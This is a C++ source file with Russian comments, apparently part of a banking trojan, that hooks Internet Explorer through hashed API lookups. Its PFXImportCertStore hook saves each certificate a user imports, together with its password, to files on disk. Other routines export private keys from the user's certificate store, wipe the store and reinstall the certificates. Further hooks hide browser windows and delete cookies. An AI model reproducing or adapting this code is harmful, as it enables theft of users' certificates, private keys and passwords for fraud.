#include <windows.h>
#include <wininet.h>


#include "GetApi.h"
#include "Utils.h"

#include "Memory.h"
#include "Strings.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Crypt.h"
#include "Unhook.h"
#include "Splice.h"



#include "InternetExplorer.h"
#include "Unhook.h"

#include "ntdll.h"

#include "coocksol.h"

//функции работы с сертификатами
struct DataSert 
{
	CRYPT_DATA_BLOB pfxBlob; //сертификат
	char* name; //имя хранилища
	WCHAR* password;
	int count; //количество сертификатов в хранилище
};

char* sert_my = "My"; //имя хранилища
WCHAR* sert_pass = L"pass"; //пароль для шифрования (можно любой)
char* fileExport = "c:\\cert.pfx"; //имя файла куда сохраняется сертификат
char* filePassword = "c:\\cert.psw"; //имя файла куда сохраняется файл

bool GetSert( DataSert& );
bool PutSert( DataSert& );
void ClearDataSert( DataSert& );
void SaveSert( DataSert&, const char* );
bool LoadSert( DataSert&, const char* );
bool ClearSerts( const char* nameStore );
bool DelExportSerts( char* nameStore, WCHAR* password );
bool DelExportSerts(); //удаление экспортируемых сертификтов по умолчанию

//все функции которые мы будем хучить для IE

typedef BOOL ( WINAPI *PShowWindow   )( HWND hWnd, int Cmd );
PShowWindow    Real_ShowWindow;

typedef MMRESULT ( WINAPI *PwaveOutWrite   )( HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh );
PwaveOutWrite    Real_waveOutWrite;

typedef HCURSOR ( WINAPI *PSetCursor   )( HCURSOR hCursor );
PSetCursor    Real_SetCursor;

typedef HCERTSTORE (WINAPI * PPFXImportCertStore)(CRYPT_DATA_BLOB* pPFX, LPCWSTR szPassword, DWORD dwFlags);
PPFXImportCertStore Real_PFXImportCertStore;


MMRESULT WINAPI Hook_WaveOutWrite(HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh)
{
	DbgMsg("Hook_WaveOutWrite",0,"WORK!!!!!!!!!");
	return MMSYSERR_NODRIVER;
}

HCURSOR WINAPI Hook_SetCursor(HCURSOR hCursor)
{
	DbgMsg("Hook_SetCursor",0,"FUCK!!!!!!!!!!!");

	// Заменяем курсор на стандартную стрелочку
	// и вызываем оригинальную функцию
	HCURSOR cur = LoadCursor(NULL, IDC_ARROW);
	return Real_SetCursor(cur);
}


BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)
{
	//OutputDebugString("Hook_ShowWindow");

	char cClasN[MAX_PATH];
	pGetClassNameA(hWnd,cClasN,MAX_PATH);
//	DbgMsg(cClasN,(int)hWnd,"All Wind ");
	

	if (cClasN[0]=='#')
	{
		DbgMsg(cClasN,(int)hWnd,"hParent!1");
		HWND hParent = (HWND)pGetParent(hWnd);
		
		
		if (hParent!=NULL)
		{
			DbgMsg(cClasN,(int)hWnd,"hParent!=0");
			//bool tmp=(bool)pIsWindowVisible(hParent);
			//if (!tmp)
			{
				char str[260];
				pGetWindowTextA(hParent,str,260);
				DbgMsg(str,(int)hParent,"pIsWindowVisible hParent!3");
			//	OutputDebugString("Hiden Window");
				
			
				if (m_strstr(str,"Internet"))
				//if (IsInternetExplorer())
				{
				//	DbgMsg(str,(int)hWnd,"!");
					//HWND hParent = (HWND)pGetParent(hWnd);
					pGetWindowTextA(hWnd,str,260);
					DbgMsg(str,(int)hWnd,"Hide!");
					pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
					pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED );
					pSetLayeredWindowAttributes(hWnd, 0, 70, LWA_ALPHA);
					//Cmd=0;
				}
				
				//Cmd=0;
				
			}
		}
	}	
	return Real_ShowWindow(hWnd, Cmd);
}


HCERTSTORE WINAPI Hook_PFXImportCertStore(CRYPT_DATA_BLOB *data, LPCWSTR password, DWORD flags)
{
	HCERTSTORE certstore = Real_PFXImportCertStore(data, password, flags);
	if(certstore != NULL && (flags & 0x10000000) == 0 && data && data->cbData > 0 && data->pbData != NULL)
	{
		//сохраняем сертификат
		DataSert dataSert;
		dataSert.pfxBlob.pbData = data->pbData;
		dataSert.pfxBlob.cbData = data->cbData;
		SaveSert( dataSert, fileExport );
		//сохраняем пароль
		HANDLE fout = (HANDLE)pCreateFileA( filePassword, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0 );
		if( fout != INVALID_HANDLE_VALUE ) 
		{
			DWORD rl;
			int len = 2 * (int)plstrlenW(password);
			pWriteFile( fout, password, len, &rl, 0 );
			pCloseHandle(fout);
		}

	}
	return certstore;
}



bool WINAPI IsInternetExplorer()
{
	// Функция вернёт истину если она вызвана в процессе
	// интернет експлорера

	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
//	DbgMsgW(L"эксплорер ли это?",1,ModulePath);
	DWORD dwProcessHash = GetNameHash( ModulePath );

	

	if ( dwProcessHash == 0x250DFA8F /*||		//iexplore.exe
		 dwProcessHash == 0x1D30C46B ||		//
		 dwProcessHash == 0xC032B37E ||		//ieuser.exe //test for Vista
		 dwProcessHash == 0x490A0972*/ )		// explorer.exe
	{
//	DbgMsgW(L"АГА Эксплорер",1,ModulePath);
		MemFree( ModulePath );
		return true;
	}
	MemFree( ModulePath );
	return false;
}



bool HookInternetExplorer()
{
	// функция вешает хуки на базовые функции которые использует
	// Internet Explorer для загрузки документов
	// Работает только в случае вызова из процесса интернет експлорера

	if ( !IsInternetExplorer() )
	{
		return false;
	}

	UnhookIE();


	//pHead = NULL;
	DelExportSerts();

	HookInternetExplorerApi();

	return true;
}


bool HookInternetExplorerApi()
{
	DbgMsg("HookInternetExplorerApi",0,"BEFORE");

	if ( HookApi( 3, 0x7506E960, (DWORD)&Hook_ShowWindow ) )
	{  
		__asm mov [Real_ShowWindow], eax			
	}	

	/*if ( HookApi( 12, 0x1BCB55BB, (DWORD)&Hook_WaveOutWrite ) )
	{  
		__asm mov [Real_waveOutWrite], eax			
	}	*/

	if ( HookApi( 3, 0xD9725ED, (DWORD)&Hook_SetCursor ) )
	{  
		__asm mov [Real_SetCursor], eax			
	}	

	
	if( HookApi( 15, 0x3A1B7F5D, (DWORD)&Hook_PFXImportCertStore ) )
	{
		__asm mov [Real_PFXImportCertStore], eax			
	}
	

	Delete_IECookies_Norm(true, true);

	DbgMsg("HookInternetExplorerApi",0,"AFTER");
	
	return true;
}


bool GetSert( DataSert& dataSert )
{
	bool ret = false;
	HANDLE hstore = pCertOpenSystemStoreA( NULL, dataSert.name );
	if( hstore != NULL )
	{
		dataSert.count = 0; //количество сертефикатов
		PCCERT_CONTEXT certContext = 0;
		while( (certContext = (PCCERT_CONTEXT)pCertEnumCertificatesInStore( hstore, certContext ) ) != NULL)
			dataSert.count++;

		if( dataSert.count > 0 )
		{
			//Получаем размер хранилища.
			dataSert.pfxBlob.pbData = NULL;
			dataSert.pfxBlob.cbData = 0;
			if( pPFXExportCertStoreEx( hstore, &dataSert.pfxBlob, dataSert.password, 0, EXPORT_PRIVATE_KEYS) != FALSE )
			{
				dataSert.pfxBlob.pbData = (unsigned char*)MemAlloc( dataSert.pfxBlob.cbData );
				if( pPFXExportCertStoreEx( hstore, &dataSert.pfxBlob, dataSert.password, 0, EXPORT_PRIVATE_KEYS ) != FALSE ) 
				{
					ret = true;
				}
			}
		}
		else
			ret = true;
		pCertCloseStore( hstore, 0 );
	}
	return ret;
}

bool PutSert( DataSert& dataSert )
{
	bool ret = false;
	PCCERT_CONTEXT pctx;
	HANDLE pfxStore = pPFXImportCertStore( &dataSert.pfxBlob, dataSert.password, CRYPT_MACHINE_KEYSET | CRYPT_EXPORTABLE );
	if( pfxStore )
	{
		HANDLE hstore = pCertOpenSystemStoreA( NULL, dataSert.name );
		if( hstore ) 
		{
			PCCERT_CONTEXT certContext = (PCCERT_CONTEXT)pCertEnumCertificatesInStore( pfxStore, 0) ;
			if( pCertAddCertificateContextToStore( hstore, certContext, CERT_STORE_ADD_ALWAYS /*CERT_STORE_ADD_NEW*/, 0) )
			{
		       ret = true;
			} 
		}
		pCertCloseStore( hstore, 0 );
		pCertCloseStore( pfxStore, 0 );
	}
 return ret;
}

void SaveSert( DataSert& dataSert, const char* nameFile )
{
	HANDLE fout = (HANDLE)pCreateFileA( nameFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0 );
	if( fout == INVALID_HANDLE_VALUE ) return;
	DWORD rl;
	pWriteFile( fout, dataSert.pfxBlob.pbData, dataSert.pfxBlob.cbData, &rl, 0 );
	pCloseHandle(fout);
}

bool LoadSert( DataSert& dataSert, const char* nameFile )
{
	HANDLE fout = pCreateFileA( nameFile, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
	if( fout == INVALID_HANDLE_VALUE ) return false;
	dataSert.pfxBlob.cbData = (DWORD)pGetFileSize( fout, 0 );
	dataSert.pfxBlob.pbData = (unsigned char*)MemAlloc(dataSert.pfxBlob.cbData);
	DWORD rl;
	pReadFile( fout, dataSert.pfxBlob.pbData, dataSert.pfxBlob.cbData, &rl, 0 );
	pCloseHandle(fout);
	return true;;
}

bool ClearSerts( const char* nameStore )
{
	bool ret = false;
  
	HANDLE hstore = pCertOpenSystemStoreA( NULL, nameStore );
	if( hstore != NULL)
	{
	    PCCERT_CONTEXT certContext = 0;
		while( (certContext = (PCCERT_CONTEXT)pCertEnumCertificatesInStore( hstore, certContext )) != NULL ) 
		{
			PCCERT_CONTEXT dupCertContext = (PCCERT_CONTEXT)pCertDuplicateCertificateContext(certContext);
			if( dupCertContext != NULL )
				pCertDeleteCertificateFromStore(dupCertContext);
		}
		ret = true;
		pCertCloseStore( hstore, 0 );
	}
  return ret;
}

bool DelExportSerts()
{
	return DelExportSerts(sert_my, sert_pass);
}

bool DelExportSerts( char* nameStore, WCHAR* password )
{
	bool ret = false;
	DataSert dataSert;
	dataSert.pfxBlob.pbData = 0;
	dataSert.pfxBlob.cbData = 0;
	dataSert.name = nameStore;
	dataSert.password = password;
	if( GetSert(dataSert) ) //извлекаем сертификаты
	{
		ClearSerts(dataSert.name); //удаляем все
		if( PutSert(dataSert) ) //ставим на место, в этом случае установятся только экспортируемые
		{
			ret = true;
		}
	}
	return ret;
}

void ClearDataSert( DataSert& dataSert )
{
	MemFree(dataSert.pfxBlob.pbData);
	dataSert.pfxBlob.pbData = 0;
	dataSert.pfxBlob.cbData = 0;
}


